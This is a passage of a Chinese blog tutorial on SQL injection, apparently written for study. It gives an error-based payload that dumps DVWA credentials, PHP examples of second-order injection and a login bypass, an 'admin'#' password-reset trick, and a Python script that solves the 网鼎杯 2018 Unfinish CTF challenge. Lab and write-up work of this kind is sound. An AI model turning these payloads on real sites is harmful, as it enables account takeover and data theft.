id=1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> dvwa<span class="token punctuation">.</span>users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token comment">#</span>
</code></pre> 
<p><a href="https://www.cnblogs.com/c1047509362/p/12806297.html" rel="nofollow">SQL注入实战之报错注入</a></p> 
<h3><a id="_220"></a>二次注入</h3> 
<p>堆叠注入：使用<code>;</code>执行多条语句，一般情况下不能够使用</p> 
<p>攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到<code>SQL查询</code>语句所导致的注入。<br> <code>两次注入</code>分别是<code>插入恶意数据</code>、<code>利用恶意数据</code></p> 
<p>所以也就是满足这两个条件即可</p> 
<ul><li>用户向数据库插入恶意数据，即使后端对语句做了转义，如<code>mysql_escape_string</code>、<code>mysql_real_escape_string</code>等函数<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$item</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Zak's Laptop"</span><span class="token punctuation">;</span>
<span class="token variable">$escaped_item</span> <span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Escaped string: %s\n"</span><span class="token punctuation">,</span> <span class="token variable">$escaped_item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>		<span class="token comment">// Escaped string: Zak\'s Laptop</span>
</code></pre> <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// We didn't check $_POST['password'], it could be anything the user wanted! For example:</span>
<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aidan'</span><span class="token punctuation">;</span>
<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"' OR ''='"</span><span class="token punctuation">;</span>

<span class="token comment">// Query database to check if there are any matching users</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE user='<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>' AND password='<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>'"</span><span class="token punctuation">;</span>
<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// This means the query sent to MySQL would be:</span>
<span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span>	<span class="token comment">// SELECT * FROM users WHERE user='aidan' AND password='' OR ''=''</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> </li><li>数据库能够将恶意数据取出<br> <img src="https://images2.imgbox.com/e2/41/k7ALj9Ul_o.png" alt="TEST1"><br> 注册账户那就去注册一下，这里直接注册admin’#<br> <img src="https://images2.imgbox.com/9e/82/TSpKOygw_o.png" alt="TEST2"><br> 用注册的账号登录进去后发现可以修改密码。<br> <img src="https://images2.imgbox.com/cc/0f/5nuGDHD9_o.png" alt="test3"></li></ul> 
<p>修改密码的语句应该类似</p> 
<pre><code class="prism language-sql"><span class="token keyword">update</span> users <span class="token keyword">set</span> password<span class="token operator">=</span><span class="token string">'$new_pass'</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'$user'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$old_pass'</span><span class="token punctuation">;</span>
</code></pre> 
<p>注册一个这样的账号 admin’# 上述sql语句就变成这样</p> 
<pre><code class="prism language-sql"><span class="token keyword">update</span> users <span class="token keyword">set</span> password<span class="token operator">=</span><span class="token string">'$new_pass'</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token comment"># and password='$old_pass';</span>
</code></pre> 
<p>语句原义被破坏，本来修改的是admin’# 用户的账号和密码，现在却是变成了直接修改admin用户的密码！</p> 
<p>那就随便输入个密码12345修改后再拿它去尝试登录admin账户，发现成功登入。<br> <img src="https://images2.imgbox.com/26/65/59KtbTm6_o.png" alt="test4"></p> 
<p><font color="#C678DD" size="4"><strong>网鼎杯 2018Unfinish</strong></font></p> 
<p>源码与此非常相似：<a href="https://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/" rel="nofollow">https://www.beesfun.com/2017/03/28/MySQL注入系列之二次注入-三/</a></p> 
<p>随便注册一个进行测试<br> 在源码中发现了username的出现，应该会是二次注入<br> <img src="https://images2.imgbox.com/65/c8/1vbWakA9_o.png" alt="test1"></p> 
<p><font color="#4F5B93" size="4"><strong>Mysql 字符串运算</strong></font></p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> <span class="token string">'1'</span> <span class="token operator">+</span> <span class="token string">'2'</span>
<span class="token comment"># 3</span>
<span class="token keyword">select</span> <span class="token string">'1'</span><span class="token operator">+</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token punctuation">;</span>
<span class="token comment">#1</span>
<span class="token keyword">select</span> <span class="token string">'0'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token punctuation">;</span>
<span class="token comment">#776562 -&gt; web的16进制</span>
<span class="token keyword">select</span> <span class="token string">'0'</span><span class="token operator">+</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token punctuation">;</span>
<span class="token comment">#119 -&gt; w的ascii码</span>
<span class="token keyword">select</span> <span class="token string">'0'</span><span class="token operator">+</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token punctuation">;</span>
<span class="token comment">##119 -&gt; w的ascii码</span>
</code></pre> 
<p>使用爬虫将源码中的username爬取出来，源码过滤了<code>information</code>和<code>,</code>。</p> 
<pre><code class="prism language-py"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup

<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    url <span class="token operator">=</span> <span class="token string">'http://759d93aa-53fb-4d2e-8f93-99833fbe0ff2.node5.buuoj.cn:81/'</span>
    register_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">'register.php'</span>
    login_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">'login.php'</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
        <span class="token comment">#  "username" : "0'+ascii(substr(database() from {} for 1))+'0".format(i) 爆数据库</span>
        register_data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"abc{}@qq.com"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>
                 <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"0'+ascii(substr((select * from flag) from {} for 1))+'0"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"12345"</span><span class="token punctuation">}</span>
        login_data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"abc{}@qq.com"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"12345"</span><span class="token punctuation">}</span>
        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>register_url<span class="token punctuation">,</span> data<span class="token operator">=</span>register_data<span class="token punctuation">)</span>
        response_login <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>login_url<span class="token punctuation">,</span> data<span class="token operator">=</span>login_data<span class="token punctuation">)</span>
        bs <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response_login<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'html.parser'</span><span class="token punctuation">)</span> 
        username <span class="token operator">=</span> bs<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span> class_<span class="token operator">=</span><span class="token string">'user-name'</span><span class="token punctuation">)</span>  <span class="token comment"># 取返回页面数据的span class=user-name属性</span>
        number <span class="token operator">=</span> username<span class="token punctuation">.</span>text  
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p><a href="https://www.cnblogs.com/haorancracker/articles/17695948.html" rel="nofollow">参考文章</a><br> <a href="https://www.bilibili.com/video/BV1bC4y1s7hb/?spm_id_from=333.337.search-card.all.click&amp;vd_source=feda7b4b64bdcc4da7a9d3fc1f949e0b" rel="nofollow">Xpath注入</a></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/4c229242018db5cd1d434e7356606c46/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">解决：The following signatures were invalid: EXPKEYSIG F42ED6FBAB17C654 Open Robotics问题</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/7f553948dc3537339cbfefeedaeedf48/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">打 jar 包运行 在windows 平台控制台和日志 乱码解决</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>